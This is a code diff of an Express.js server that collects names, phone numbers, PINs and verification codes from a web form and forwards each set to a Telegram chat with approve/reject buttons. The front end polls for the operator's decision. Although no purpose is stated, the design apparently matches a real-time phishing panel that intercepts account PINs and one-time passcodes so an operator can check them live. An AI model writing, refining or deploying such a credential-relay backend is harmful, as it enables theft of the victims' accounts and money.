@@ -4,11 +4,11 @@ const path = require('path');
 const axios = require('axios');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = 3000;
 
-// In-memory approvals
-const approvedPins = {};   // pin: null | true | false
-const approvedCodes = {};  // code: null | true | false
+// In-memory approved pins and codes
+const approvedPins = {};
+const approvedCodes = {};
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -17,19 +17,26 @@ app.use(express.static(path.join(__dirname, 'public')));
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// ---------------------- Telegram helper ----------------------
+// Helper to send Telegram messages
 async function sendTelegramMessage(text, inlineKeyboard = null) {
     try {
-        const payload = { chat_id: TELEGRAM_CHAT_ID, text };
+        const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text,
+        };
         if (inlineKeyboard) payload.reply_markup = { inline_keyboard: inlineKeyboard };
-        const res = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
+
+        const res = await axios.post(
+            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+            payload
+        );
         console.log('✅ Telegram message sent:', res.data);
     } catch (err) {
         console.error('❌ Failed to send Telegram message:', err.message);
     }
 }
 
-// ---------------------- PIN FLOW ----------------------
+// ---------------------- Routes ----------------------
 
 // Submit PIN
 app.post('/submit-pin', (req, res) => {
@@ -38,6 +45,7 @@ app.post('/submit-pin', (req, res) => {
 
     approvedPins[pin] = null; // pending
 
+    // Send Telegram message with buttons
     const inlineKeyboard = [
         [
             { text: '✅ Correct PIN', callback_data: `correct_pin:${pin}` },
@@ -45,25 +53,28 @@ app.post('/submit-pin', (req, res) => {
         ]
     ];
 
-    sendTelegramMessage(`🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, inlineKeyboard);
+    const msg = `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`;
+    sendTelegramMessage(msg, inlineKeyboard);
 
     res.json({ status: 'pending' });
 });
 
-// Poll PIN approval
+// Check PIN approval (front-end polling)
 app.get('/check-pin/:pin', (req, res) => {
     const pin = req.params.pin;
-    res.json({ approved: approvedPins[pin] }); // null=pending, true=correct, false=wrong
+    const state = approvedPins[pin];
+
+    if (state === true) return res.json({ approved: true });
+    if (state === false) return res.json({ approved: false });
+    return res.json({ approved: null }); // still waiting
 });
 
-// ---------------------- CODE FLOW ----------------------
-
-// Submit code
+// Submit CODE
 app.post('/submit-code', (req, res) => {
-    const { name, phone, code } = req.body;  // <-- include name and phone
+    const { name, phone, code } = req.body;
     console.log('📩 /submit-code HIT', { name, phone, code });
 
-    approvedCodes[code] = false;
+    approvedCodes[code] = null; // pending
 
     const inlineKeyboard = [
         [
@@ -72,40 +83,39 @@ app.post('/submit-code', (req, res) => {
         ]
     ];
 
-    // Send name, phone, and code to Telegram
+    // Send Telegram message with name, phone, and code
     const msg = `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`;
     sendTelegramMessage(msg, inlineKeyboard);
 
     res.json({ status: 'pending' });
 });
 
-
-// Poll CODE approval
+// Check CODE approval (front-end polling)
 app.get('/check-code/:code', (req, res) => {
     const code = req.params.code;
-    res.json({ approved: approvedCodes[code] }); // null=pending, true=correct, false=wrong
+    const state = approvedCodes[code];
+
+    if (state === true) return res.json({ approved: true });
+    if (state === false) return res.json({ approved: false });
+    return res.json({ approved: null }); // still waiting
 });
 
-// ---------------------- TELEGRAM WEBHOOK ----------------------
+// ---------------------- Telegram Webhook ----------------------
 app.post('/telegram-webhook', express.json(), (req, res) => {
+    console.log('📩 Telegram callback received:', JSON.stringify(req.body, null, 2));
+
     const callback = req.body?.callback_query;
     if (!callback) return res.sendStatus(200);
 
-    console.log('📩 Telegram callback received:', JSON.stringify(req.body, null, 2));
-
     const [action, value] = callback.data.split(':');
 
-    // PIN actions
     if (action === 'correct_pin') approvedPins[value] = true;
     if (action === 'wrong_pin') approvedPins[value] = false;
 
-    // CODE actions
     if (action === 'correct_code') approvedCodes[value] = true;
     if (action === 'wrong_code') approvedCodes[value] = false;
 
-    sendTelegramMessage(`Action received: ${callback.data}`);
-
-    return res.sendStatus(200);
+    return res.json({ text: 'Action received' });
 });
 
 // ---------------------- Start Server ----------------------
